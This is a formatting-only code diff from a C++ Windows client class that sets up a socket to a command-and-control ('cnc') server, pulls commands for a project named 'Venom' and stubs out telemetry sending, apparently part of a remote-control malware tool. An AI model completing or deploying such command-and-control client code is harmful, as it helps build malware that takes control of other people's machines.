@@ -4,7 +4,7 @@ CommunicationHandler::Communicator::Communicator(std::string cncIp, int cncPort)
 {
 	cncInformation.sin_family = AF_INET;
 	cncInformation.sin_port = htons(cncPort);
-	inet_pton(AF_INET ,cncIp.c_str(), &cncInformation.sin_addr.S_un.S_addr);
+	inet_pton(AF_INET, cncIp.c_str(), &cncInformation.sin_addr.S_un.S_addr);
 
 	//Initialize the socket
 	if (0 != WSAStartup(dllVersion, &wsaData))
@@ -14,10 +14,10 @@ CommunicationHandler::Communicator::Communicator(std::string cncIp, int cncPort)
 	if (connectionSocket == INVALID_SOCKET)
 		goto Error;
 
-	Error:
-		std::cout << "fuck" << std::endl;
-		// Add a kill switch for venom, should be a generic function for all classes in case of a fatal failure
-		//WSACleanup();
+Error:
+	std::cout << "fuck" << std::endl;
+	// Add a kill switch for venom, should be a generic function for all classes in case of a fatal failure
+	//WSACleanup();
 }
 
 bool CommunicationHandler::Communicator::connectToCnc()
@@ -40,7 +40,7 @@ void CommunicationHandler::Communicator::sendTelemetry()
 	// Need to implement.
 }
 
-bool CommunicationHandler::Communicator::pullCommand(VenomCommands::Command *recievedCommand)
+bool CommunicationHandler::Communicator::pullCommand(VenomCommands::Command* recievedCommand)
 {
 	// Get data buffer size.
 	char* size = { 0 };
